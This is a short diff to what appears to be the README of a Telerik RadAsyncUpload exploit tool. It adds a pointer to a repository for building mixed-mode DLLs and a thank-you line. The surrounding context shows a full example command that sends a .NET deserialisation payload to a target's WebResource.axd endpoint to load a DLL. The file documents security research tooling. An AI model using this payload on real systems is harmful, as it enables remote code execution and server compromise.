@@ -86,4 +86,9 @@ Example .NET deserialisation payload:
 $ ./RAU_crypto.py -C '{"Path":"file:///c:/users/public/documents/mixedmode64.dll"}' 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' http://target/Telerik.Web.UI.WebResource.axd?type=rau
 ```
 
+Mixed Mode DLL
+
+See my other github repo:
+https://github.com/bao7uo/MixedUp
+
 Special thanks to [@irsdl]( https://github.com/irsdl ) who inspired the custom payload feature.
